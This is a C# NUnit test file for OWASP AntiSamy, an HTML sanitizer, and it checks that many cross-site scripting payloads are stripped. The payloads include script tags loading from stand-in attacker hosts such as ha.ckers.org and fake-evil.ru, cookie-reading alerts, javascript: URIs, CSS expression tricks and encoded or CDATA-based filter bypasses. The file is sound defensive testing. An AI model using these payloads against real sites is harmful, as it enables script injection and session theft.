/*
 * Copyright (c) 2009-2020, Arshan Dabirsiaghi, Sebastián Passaro
 * 
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
 * 
 * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
 * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
 * Neither the name of OWASP nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
 * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 * PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
 * PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
 * LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
 * NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

using System;
using System.Collections.Generic;
using System.Text;
using System.Text.RegularExpressions;
using FluentAssertions;
using NUnit.Framework;
using OWASP.AntiSamy.Html;
using OWASP.AntiSamy.Html.Model;
using Constants = OWASP.AntiSamy.Html.Scan.Constants;

namespace AntiSamyTests
{
    [TestFixture]
    public class AntiSamyTest
    {
        private AntiSamy antisamy;
        private Policy policy;

        [SetUp]
        public void SetUp()
        {
            antisamy = new AntiSamy();
            policy = Policy.GetInstance(TestConstants.DEFAULT_POLICY_PATH);
        }

        [Test(Description = "Test basic XSS cases.")]
        public void TestScriptAttacks()
        {
            antisamy.Scan("test<script>alert(document.cookie)</script>", policy).GetCleanHtml().Should().NotContain("script");
            antisamy.Scan("<<<><<script src=http://fake-evil.ru/test.js>", policy).GetCleanHtml().Should().NotContain("<script");
            antisamy.Scan("<script<script src=http://fake-evil.ru/test.js>>", policy).GetCleanHtml().Should().NotContain("<script");
            antisamy.Scan("<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).GetCleanHtml().Should().NotContain("<script");
            antisamy.Scan("<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>", policy).GetCleanHtml().Should().NotContain("onload");
            antisamy.Scan("<BODY ONLOAD=alert('XSS')>", policy).GetCleanHtml().Should().NotContain("alert");
            antisamy.Scan("<iframe src=http://ha.ckers.org/scriptlet.html <", policy).GetCleanHtml().Should().NotContain("<iframe");
            antisamy.Scan("<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">", policy).GetCleanHtml().Should().NotContain("src");
        }

        [Test]
        public void TestImgAttacks()
        {
            antisamy.Scan("<img src='http://www.myspace.com/img.gif'>", policy).GetCleanHtml().Should().Contain("<img");
            antisamy.Scan("<img src=javascript:alert(document.cookie)>", policy).GetCleanHtml().Should().NotContain("<img");
            antisamy.Scan("<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>", policy).GetCleanHtml()
                .Should().NotContain("<img");
            antisamy.Scan("<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040" +
                "&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>", policy).GetCleanHtml().Should().Contain("&amp;");
            antisamy.Scan("<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>", policy).GetCleanHtml()
                .Should().Contain("&amp;");
            antisamy.Scan("<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">", policy).GetCleanHtml().Should().NotContain("alert");
            antisamy.Scan("<IMG SRC=\"javascript:alert('XSS')\"", policy).GetCleanHtml().Should().NotContain("javascript");
            antisamy.Scan("<IMG LOWSRC=\"javascript:alert('XSS')\">", policy).GetCleanHtml().Should().NotContain("javascript");
            antisamy.Scan("<BGSOUND SRC=\"javascript:alert('XSS');\">", policy).GetCleanHtml().Should().NotContain("javascript");
        }

        [Test]
        public void TestHrefAttacks()
        {
            antisamy.Scan("<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">", policy).GetCleanHtml().Should().NotContain("href");
            antisamy.Scan("<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">", policy).GetCleanHtml().Should().NotContain("href");
            antisamy.Scan("<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>", policy).GetCleanHtml().Should().NotContain("ha.ckers.org");
            antisamy.Scan("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>", policy).GetCleanHtml().Should().NotContain("ha.ckers.org");
            antisamy.Scan("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>", policy).GetCleanHtml().Should().NotContain("xss.htc");
            antisamy.Scan("<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS", policy).GetCleanHtml().Should().NotContain("javascript");
            antisamy.Scan("<IMG SRC='vbscript:msgbox(\"XSS\")'>", policy).GetCleanHtml().Should().NotContain("vbscript");
            antisamy.Scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">", policy).GetCleanHtml().Should().NotContain("<meta");
            antisamy.Scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">", policy).GetCleanHtml().Should().NotContain("<meta");
            antisamy.Scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">", policy).GetCleanHtml().Should().NotContain("<meta");
            antisamy.Scan("<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>", policy).GetCleanHtml().Should().NotContain("iframe");
            antisamy.Scan("<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>", policy).GetCleanHtml().Should().NotContain("javascript");
            antisamy.Scan("<TABLE BACKGROUND=\"javascript:alert('XSS')\">", policy).GetCleanHtml().Should().NotContain("background");
            antisamy.Scan("<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">", policy).GetCleanHtml().Should().NotContain("background");
            antisamy.Scan("<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", policy).GetCleanHtml().Should().NotContain("javascript");
            antisamy.Scan("<DIV STYLE=\"width: expression(alert('XSS'));\">", policy).GetCleanHtml().Should().NotContain("alert");
            antisamy.Scan("<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", policy).GetCleanHtml().Should().NotContain("alert");
            antisamy.Scan("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>", policy).GetCleanHtml().Should().NotContain("ript:alert");
            antisamy.Scan("<BASE HREF=\"javascript:alert('XSS');//\">", policy).GetCleanHtml().Should().NotContain("javascript");
            antisamy.Scan("<BaSe hReF=\"http://arbitrary.com/\">", policy).GetCleanHtml().Should().NotContain("<base");
            antisamy.Scan("<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>", policy).GetCleanHtml().Should().NotContain("<object");
            antisamy.Scan("<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>", policy).GetCleanHtml().Should().NotContain("javascript");
            antisamy.Scan("<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>", policy).GetCleanHtml().Should().NotContain("<embed");
            antisamy.Scan("<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJod" +
                "HRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUy" +
                "IpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>", policy).GetCleanHtml().Should().NotContain("<embed");
            antisamy.Scan("<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).GetCleanHtml().Should().NotContain("<script");
            antisamy.Scan("<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).GetCleanHtml().Should().NotContain("<script");
            antisamy.Scan("<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).GetCleanHtml().Should().NotContain("<script");
            antisamy.Scan("<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).GetCleanHtml().Should().NotContain("<script");
            antisamy.Scan("<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).GetCleanHtml().Should().NotContain("script");
            antisamy.Scan("<SCRIPT SRC=http://ha.ckers.org/xss.js", policy).GetCleanHtml().Should().NotContain("<script");
            antisamy.Scan("<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115" +
                "&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115" +
                "&#41&>", policy).GetCleanHtml().Should().NotContain("&amp;");
            antisamy.Scan("<a href='aim: &c:\\windows\\system32\\calc.exe' ini='C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\pwnd.bat'>", policy).GetCleanHtml()
                .Should().NotContain("aim.exe");
            antisamy.Scan("<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->", policy).GetCleanHtml().Should().NotContain("javascript");
            antisamy.Scan("<a></a style=\"\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\">", policy).GetCleanHtml()
                .Should().NotContain("document");
            antisamy.Scan("<dIv/sTyLe='background-image: url(sheep.png), url(\"javascript:alert('XSS')\");'></dIv>", policy).GetCleanHtml().Should().Contain("style=''");
            antisamy.Scan("<dIv/sTyLe='background-image: url(sheep.png), url(\"https://safe.com/kitten.jpg\");'></dIv>", policy).GetCleanHtml()
                .Should().ContainAll("sheep.png", "kitten.jpg");
            antisamy.Scan("<a href=\"http://example.com\"&amp;/onclick=alert(9)>foo</a>", policy).GetCleanHtml().Should().Be("<a href=\"http://example.com\" rel=\"nofollow\">foo</a>");
        }

        [Test(Description = "Test CSS protections.")]
        public void TestCssAttacks()
        {
            antisamy.Scan("<div style=\"position:absolute\">", policy).GetCleanHtml().Should().NotContain("position");
            antisamy.Scan("<style>b { position:absolute }</style>", policy).GetCleanHtml().Should().NotContain("position");
            antisamy.Scan("<div style=\"z-index:25\">", policy).GetCleanHtml().Should().NotContain("z-index");
            antisamy.Scan("<style>z-index:25</style>", policy).GetCleanHtml().Should().NotContain("z-index");
        }

        [Test(Description = "Tests issues #12 and #36 from owaspantisamy Google Code Archive.")]
        public void TestEmptyTags()
        {
            string html = antisamy.Scan("<br ><strong></strong><a>hello world</a><b /><i/><hr>", policy).GetCleanHtml();
                
            var regex = new Regex(".*<strong(\\s*)/>.*");
            regex.IsMatch(html).Should().BeFalse();

            regex = new Regex(".*<b(\\s*)/>.*");
            regex.IsMatch(html).Should().BeFalse();

            regex = new Regex(".*<i(\\s*)/>.*");
            regex.IsMatch(html).Should().BeFalse();
            
            (html.Contains("<hr />") || html.Contains("<hr/>")).Should().BeTrue();
        }

        [Test(Description = "Tests issue #20 from owaspantisamy Google Code Archive.")]
        public void TestMisplacedTag()
        {
            antisamy.Scan("<b><i>Some Text</b></i>", policy).GetCleanHtml().Should().NotContain("<i />");
        }

        [Test(Description = "Tests issue #25 from owaspantisamy Google Code Archive.")]
        public void TestMarginRemovalFromInlineStyle()
        {
            antisamy.Scan("<div style=\"margin: -5em\">Test</div>", policy).GetCleanHtml().Should().Be("<div style=\"\">Test</div>");
        }

        [Test(Description = "Tests issue #28 from owaspantisamy Google Code Archive.")]
        public void TestPreserveFontFamily()
        {
            antisamy.Scan("<div style=\"font-family: Geneva, Arial, courier new, sans-serif\">Test</div>", policy).GetCleanHtml().Should().Contain("font-family");
        }
       
        [Test(Description = "Tests issue #30 from owaspantisamy Google Code Archive>: 'missing quotes around properties with spaces'")]
        [Ignore("CDATA is not handled by HtmlAgilityPack the same way than the Java version. The code works but the format is just different.")]
        public void TestCssPropertiesWithMultilineAndCData()
        {
            // The current result in Windows and with HtmlAgilityPack is: 
            // "<style type=\"text/css\">\r\n//<![CDATA[\r\nP { font-family: &quot;Arial Unicode MS&quot; }\r\n//]]>//\r\n</style>"
            const string html = "<style type=\"text/css\"><![CDATA[P {\n	font-family: \"Arial Unicode MS\";\n}\n]]></style>";
            antisamy.Scan(html, policy).GetCleanHtml().Should().Be(html);

            antisamy.Scan("<style type=\"text/css\"><![CDATA[\r\nP {\r\n margin-bottom: 0.08in;\r\n}\r\n]]></style>", policy).GetCleanHtml()
                .Should().Be("<style type=\"text/css\"><![CDATA[P {\n\tmargin-bottom: 0.08in;\n}\n]]></style>");
        }

        [Test(Description = "Tests issue #31 from owaspantisamy Google Code Archive.")]
        public void TestUnknownTagEncoding()
        {
            const string html = "<b><u><g>foo</g></u></b>";

            Policy revised = policy.CloneWithDirective("onUnknownTag", "encode");
            antisamy.Scan(html, revised).GetCleanHtml().Should().ContainAll("&lt;g&gt;", "&lt;/g&gt;");

            Tag tag = policy.GetTagByName("b").MutateAction("encode");
            Policy revised2 = policy.MutateTag(tag);
            antisamy.Scan(html, revised2).GetCleanHtml().Should().ContainAll("&lt;b&gt;", "&lt;/b&gt;");
        }

        [Test(Description = "Tests issue #38 from owaspantisamy Google Code Archive.")]
        public void TestColorProcessing()
        {
            antisamy.Scan("<font color=\"#fff\">Test</font>", policy).GetCleanHtml().Should().Be("<font color=\"#fff\">Test</font>");
            // AngleSharp replaces the CSS color hex value into rgba instead of rgb, expected results are expanded in case the library changes.
            antisamy.Scan("<div style=\"color: #fff\">Test 3 letter code</div>").GetCleanHtml().Should().ContainAny(
                "color: rgba(255, 255, 255, 1)",
                "color: rgba(255,255,255,1)",
                "color: rgb(255, 255, 255)",
                "color: rgb(255,255,255)");
            antisamy.Scan("<font color=\"red\">Test</font>").GetCleanHtml().Should().Be("<font color=\"red\">Test</font>");
            antisamy.Scan("<font color=\"neonpink\">Test</font>").GetCleanHtml().Should().Be("<font>Test</font>");
            antisamy.Scan("<font color=\"#0000\">Test</font>").GetCleanHtml().Should().Be("<font>Test</font>");
            // This gets interpreted by AngleSharp as #0 = #00, so it's valid RGBA (0,0,0,0)
            antisamy.Scan("<div style=\"color: #0000\">Test</div>").GetCleanHtml().Should().ContainAny(
                "color: rgba(0, 0, 0, 0)",
                "color: rgba(0,0,0,0)",
                "color: rgb(0, 0, 0)",
                "color: rgb(0,0,0)");
            // This assertion is added to make the previous case invalid as in the original Java test
            antisamy.Scan("<div style=\"color: #00000\">Test</div>").GetCleanHtml().Should().Be("<div style=\"\">Test</div>");
            antisamy.Scan("<font color=\"#000000\">Test</font>").GetCleanHtml().Should().Be("<font color=\"#000000\">Test</font>");
            // Also AngleSharp asumes 1 in alpha value if the last hex are not present
            antisamy.Scan("<div style=\"color: #000000\">Test</div>").GetCleanHtml().Should().ContainAny(
                "color: rgba(0, 0, 0, 1)",
                "color: rgba(0,0,0,1)",
                "color: rgb(0, 0, 0)",
                "color: rgb(0,0,0)");

            // Testing an error that came up on a dependency from the Java version
            string result = null;
            try
            {
                result = antisamy.Scan("<b><u>foo<style><script>alert(1)</script></style>@import 'x';</u>bar").GetCleanHtml();
            }
            catch (Exception)
            {
                // To comply with try/catch
            }

            result.Should().NotBeNull();
        }

        [Test(Description = "Tests issue #40 from owaspantisamy Google Code Archive.")]
        public void TestMediaAttributeHandling()
        {
            antisamy.Scan("<style media=\"print, projection, screen\"> P { margin: 1em; }</style>", policy).GetCleanHtml()
                .Should().Contain("print, projection, screen");
        }

        [Test(Description = "Tests issue #41 from owaspantisamy Google Code Archive.")]
        public void TestCommentProcessing()
        {
            Policy revised = policy.CloneWithDirective(Constants.PRESERVE_SPACE, "true");

            antisamy.Scan("text <!-- comment -->", revised).GetCleanHtml().Should().Be("text ");

            Policy revised2 = policy
                .CloneWithDirective(Constants.PRESERVE_COMMENTS, "true")
                .CloneWithDirective(Constants.PRESERVE_SPACE, "true")
                .CloneWithDirective(Constants.FORMAT_OUTPUT, "false");

            // These make sure the regular comments are kept alive and that conditional comments are ripped out.
            antisamy.Scan("<div>text <!-- comment --></div>", revised2).GetCleanHtml().Should().Be("<div>text <!-- comment --></div>");
            antisamy.Scan("<div>text <!--[if IE]> comment <[endif]--></div>", revised2).GetCleanHtml().Should().Be("<div>text <!-- comment --></div>");

            /*
            * Check to see how nested conditional comments are handled. This is
            * not very clean but the main goal is to avoid any tags. Not sure
            * on encodings allowed in comments.
            */
            antisamy.Scan("<div>text <!--[if IE]> <!--[if gte 6]> comment <[endif]--><[endif]--></div>", revised2).GetCleanHtml()
                .Should().Be("<div>text <!-- <!-- comment -->&lt;[endif]--&gt;</div>");

            // Regular comment nested inside conditional comment. Test makes sure.
            antisamy.Scan("<div>text <!--[if IE]> <!-- IE specific --> comment <[endif]--></div>", revised2).GetCleanHtml()
                .Should().Be("<div>text <!-- <!-- IE specific --> comment &lt;[endif]--&gt;</div>");

            // These play with whitespace and have invalid comment syntax.
            antisamy.Scan("<div>text <!-- [ if lte 6 ]>\ncomment <[ endif\n]--></div>", revised2).GetCleanHtml()
                .Should().Be("<div>text <!-- \ncomment --></div>");
            antisamy.Scan("<div>text <![if !IE]> comment <![endif]></div>", revised2).GetCleanHtml()
                .Should().Be("<div>text  comment </div>");
            antisamy.Scan("<div>text <![ if !IE]> comment <![endif]></div>", revised2).GetCleanHtml()
                .Should().Be("<div>text  comment </div>");

            const string attack = "[if lte 8]<script>";
            const string spacer = "<![if IE]>";

            var stringBuilder = new StringBuilder();

            stringBuilder.Append("<div>text<!");
            for (int i = 0; i < attack.Length; i++)
            {
                stringBuilder.Append(attack[i]);
                stringBuilder.Append(spacer);
            }
            stringBuilder.Append("<![endif]>");

            string builtAttack = stringBuilder.ToString();
            antisamy.Scan(builtAttack, revised2).GetCleanHtml().Should().NotContain("<script"); // This one leaves <script> but HTML-encoded
        }

        [Test(Description = "Tests issue #44 from owaspantisamy Google Code Archive.")]
        public void TestErrorsOnChildlessNodesOfNonAllowedElements()
        {
            const int expectedErrorNumber = 3;
            antisamy.Scan("<iframe src='http://foo.com/'></iframe><script src=''></script><link href='/foo.css'>", policy).GetNumberOfErrors()
                .Should().Be(expectedErrorNumber);
        }

        [Test(Description = "Tests issue #51 from owaspantisamy Google Code Archive.")]
        public void TestParenthesesInUrl()
        {
            const int expectedErrorNumber = 0;
            const string html = "<a href='http://subdomain.domain/(S(ke0lpq54bw0fvp53a10e1a45))/MyPage.aspx'>test</a>";
            CleanResults result = antisamy.Scan(html, policy);
            result.GetNumberOfErrors().Should().Be(expectedErrorNumber);
            result.GetCleanHtml().Should().Contain("href='http://subdomain.domain/(S(ke0lpq54bw0fvp53a10e1a45))/MyPage.aspx'");
        }

        [Test(Description = "Tests issue #56 from owaspantisamy Google Code Archive.")]
        public void TestNoSpacesAreAdded()
        {
            // HtmlAgilityPack preverves single quotes and removes last semicolon occurrence
            antisamy.Scan("<SPAN style='font-weight: bold;'>Hello World!</SPAN>", policy).GetCleanHtml()
                .Should().Contain("<span style='font-weight: bold'>Hello World!</span>");
        }

        [Test(Description = "Tests issue #58 from owaspantisamy Google Code Archive.")]
        public void TestNotAllowedInputTag()
        {
            antisamy.Scan("tgdan <input/> g  h", policy).GetNumberOfErrors()
                .Should().Be(0);
        }

        [Test(Description = "Tests issue #61 from owaspantisamy Google Code Archive.")]
        public void TestPreventNewLineAtEndOfLastValidTag()
        {
            const string dirtyInput = "blah <b>blah</b>.";
            antisamy.Scan(dirtyInput, policy).GetCleanHtml().Should().Be(dirtyInput);
        }

        [Test(Description = "Tests issue #69 from owaspantisamy Google Code Archive.")]
        public void TestCharAttribute()
        {
            antisamy.Scan("<table><tr><td char='.'>test</td></tr></table>", policy).GetCleanHtml().Should().Contain("char");
            antisamy.Scan("<table><tr><td char='..'>test</td></tr></table>", policy).GetCleanHtml().Should().NotContain("char");
            antisamy.Scan("<table><tr><td char='&quot;'>test</td></tr></table>", policy).GetCleanHtml().Should().Contain("char");
            antisamy.Scan("<table><tr><td char='&quot;a'>test</td></tr></table>", policy).GetCleanHtml().Should().NotContain("char");
            antisamy.Scan("<table><tr><td char='&quot;&amp;'>test</td></tr></table>", policy).GetCleanHtml().Should().NotContain("char");
        }

        [Test]
        public void TestLiteralLists()
        {
            CleanResults result = antisamy.Scan("hello<p align='invalid'>world</p>", policy);
            result.GetCleanHtml().Should().NotContain("invalid");
            result.GetNumberOfErrors().Should().Be(1);
            
            antisamy.Scan("hello<p align='left'>world</p>", policy).GetCleanHtml().Should().Contain("left");
        }

        [Test]
        public void TestStackExhaustion()
        {
            // This test was to measure how much it can be pushed with nesting
            var sb = new StringBuilder();
            for (int i = 0; i < Constants.MAX_NESTED_TAGS; i++)
            {
                sb.Append("<div>");
            }
            antisamy.Scan(sb.ToString(), policy).GetCleanHtml().Should().NotBeNullOrEmpty();

            // Add one more tag to push the limit
            sb.Append("<div>");
            string result = null;
            try
            {
                result = antisamy.Scan(sb.ToString()).GetCleanHtml();
            }
            catch (OWASP.AntiSamy.Exceptions.ScanException)
            {
                // To comply with try/catch
            }

            result.Should().BeNull();
        }

        [Test(Description = "Tests issue #107 from owaspantisamy Google Code Archive.")]
        public void TestErroneousNewLinesAppearing()
        {
            var sb = new StringBuilder();
            const string nl = "\n";
            const string header = "<h1>Header</h1>";
            const string para = "<p>Paragraph</p>";
            sb.Append(header);
            sb.Append(nl);
            sb.Append(para);

            string html = sb.ToString();
            string result = antisamy.Scan(html, policy).GetCleanHtml();
            result.IndexOf(nl).Should().Be(result.LastIndexOf(nl));

            int expectedLocation = header.Length;
            int actualLocation = result.IndexOf(nl);
            actualLocation.Should().BeInRange(expectedLocation - 1, expectedLocation, 
                because: "According to Java project: 'account for line separator length difference across OSes'");
        }

        [Test(Description = "Tests issue #112 from owaspantisamy Google Code Archive.")]
        public void TestEmptyTagSelfClosing()
        {
            Policy revised = policy
                .CloneWithDirective(Constants.PRESERVE_COMMENTS, "true")
                .CloneWithDirective(Constants.PRESERVE_SPACE, "true")
                .CloneWithDirective(Constants.FORMAT_OUTPUT, "false");

            antisamy.Scan("text <strong></strong> text <strong><em></em></strong> text", revised).GetCleanHtml()
                .Should().NotContainAll("<strong />", "<strong/>");

            Policy revised2 = revised.CloneWithDirective(Constants.USE_XHTML, "true");

            // Due to CDATA handling on title tag, test result is not equality checking.
            antisamy.Scan("<html><head><title>foobar</title></head><body><img src=\"http://foobar.com/pic.gif\" /></body></html>", revised2).GetCleanHtml().Should()
                .ContainAll("<title>", "foobar", "</title>", "<body><img src=\"http://foobar.com/pic.gif\" /></body>");
        }

        [Test(Description = "Tests issue #10 from nahsra/antisamy on GitHub.")]
        public void TestHtml5Colon()
        {
            antisamy.Scan("<a href=\"javascript&colon;alert&lpar;1&rpar;\">X</a>", policy).GetCleanHtml().Should().NotContain("javascript");
        }

        [Test]
        [Ignore("HtmlAgilityPack does not parse CDATA tags very well. This in particular, is wrong.")]
        public void TestCDataBypass()
        {
            CleanResults result = antisamy.Scan("<![CDATA[]><script>alert(1)</script>]]>", policy);
            result.GetNumberOfErrors().Should().BeGreaterThan(0);
            result.GetCleanHtml().Should().Contain("&lt;script").And.NotContain("<script");
        }

        [Test]
        [Ignore("HtmlAgilityPack does not parse CDATA tags very well. This in particular, is wrong.")]
        public void TestNestedCDataAttack()
        {
            antisamy.Scan("<![CDATA[]><script>alert(1)</script><![CDATA[]>]]><script>alert(2)</script>>]]>", policy).GetCleanHtml().
                Should().NotContain("<script>");
        }

        [Test(Description = "Tests issue #101 from owaspantisamy Google Code Archive.")]
        public void TestInternationalCharacterSupport()
        {
            const string html = "<b>letter 'a' with umlaut: \u00e4";

            Policy revised = policy.CloneWithDirective(Constants.ENTITY_ENCODE_INERNATIONAL_CHARS, "false");
            antisamy.Scan(html, revised).GetCleanHtml().Should().Contain("\u00e4");

            Policy revised2 = policy.CloneWithDirective(Constants.ENTITY_ENCODE_INERNATIONAL_CHARS, "true")
                .CloneWithDirective(Constants.USE_XHTML, "false");
            antisamy.Scan(html, revised2).GetCleanHtml().Should().Contain("&auml;").And.NotContain("\u00e4");

            Policy revised3 = policy.CloneWithDirective(Constants.ENTITY_ENCODE_INERNATIONAL_CHARS, "true")
                .CloneWithDirective(Constants.USE_XHTML, "true");
            antisamy.Scan(html, revised3).GetCleanHtml().Should().Contain("&auml;").And.NotContain("\u00e4");

            antisamy.Scan("<span id=\"my-span\" class='my-class'>More special characters: ɢ♠♤á</span>", revised2).GetCleanHtml().Should()
                .Be("<span id=\"my-span\" class='my-class'>More special characters: &#610;&spades;&#9828;&aacute;</span>");
        }

        [Test]
        [Ignore("Current result is <iframe />, more inspection is needed.")]
        public void TestIframeValidation()
        {
            var tag = new Tag("iframe", Constants.ACTION_VALIDATE, new Dictionary<string, OWASP.AntiSamy.Html.Model.Attribute>());
            Policy revised = policy.MutateTag(tag);

            antisamy.Scan("<iframe></iframe>", revised).GetCleanHtml().Should().Be("<iframe></iframe>");
        }

        [Test]
        public void TestNoFollowAnchors()
        {
            // If we have activated nofollowAnchors
            Policy revised = policy.CloneWithDirective(Constants.ANCHORS_NOFOLLOW, "true");

            // Adds when not present
            antisamy.Scan("<a href=\"blah\">link</a>", revised).GetCleanHtml().Should().Be("<a href=\"blah\" rel=\"nofollow\">link</a>");
            // Adds properly even with bad attr
            antisamy.Scan("<a href=\"blah\" bad=\"true\">link</a>", revised).GetCleanHtml().Should().Be("<a href=\"blah\" rel=\"nofollow\">link</a>");
            // rel with bad value gets corrected
            antisamy.Scan("<a href=\"blah\" rel=\"blh\">link</a>", revised).GetCleanHtml().Should().Be("<a href=\"blah\" rel=\"nofollow\">link</a>");
            // Correct attribute doesn't get messed with
            antisamy.Scan("<a href=\"blah\" rel=\"nofollow\">link</a>", revised).GetCleanHtml().Should().Be("<a href=\"blah\" rel=\"nofollow\">link</a>");
            // If two correct attributes, only one remaining after scan
            antisamy.Scan("<a href=\"blah\" rel=\"nofollow\" rel=\"nofollow\">link</a>", revised).GetCleanHtml().Should().Be("<a href=\"blah\" rel=\"nofollow\">link</a>");
            // Test if value is off - does it add?
            antisamy.Scan("a href=\"blah\">link</a>", revised).GetCleanHtml().Should().NotContain("nofollow");
        }

        [Test]
        public void TestProcessingInstructionRemoval()
        {
            antisamy.Scan("<div><?foo note=\"I am XML processing instruction. I wish to be excluded\" ?></div>", policy).GetCleanHtml().Should().Be("<div></div>");
            antisamy.Scan("<?xml-stylesheet type=\"text/css\" href=\"style.css\"?>", policy).GetCleanHtml().Should().BeEmpty();
        }
    }
}
